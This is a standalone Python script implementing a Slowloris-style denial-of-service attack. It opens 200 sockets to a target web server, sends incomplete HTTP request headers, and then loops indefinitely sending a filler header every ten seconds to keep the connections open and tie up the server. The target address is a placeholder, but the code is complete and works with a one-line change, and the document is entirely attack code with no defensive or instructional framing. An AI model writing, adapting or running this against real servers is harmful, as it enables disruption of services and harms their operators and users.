import socket
import time

target_host = "0.0.0.0"
target_port = 8080
connection_count = 200
socket_list = []

# Establishing the connections
for _ in range(connection_count):
    try:
        print(f"Opening connection {_}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_host, target_port))
        s.send(f"GET /?{time.time()} HTTP/1.1\r\n".encode('utf-8'))
        s.send(f"Host: {target_host}\r\n".encode('utf-8'))
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode('utf-8'))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
        socket_list.append(s)
    except socket.error:
        break

# Keeping connections open
while True:
    for s in list(socket_list):
        try:
            print("Sending keep-alive headers to maintain the connections")
            s.send(f"X-a: {time.time()}\r\n".encode('utf-8'))
        except socket.error:
            socket_list.remove(s)

    time.sleep(10)
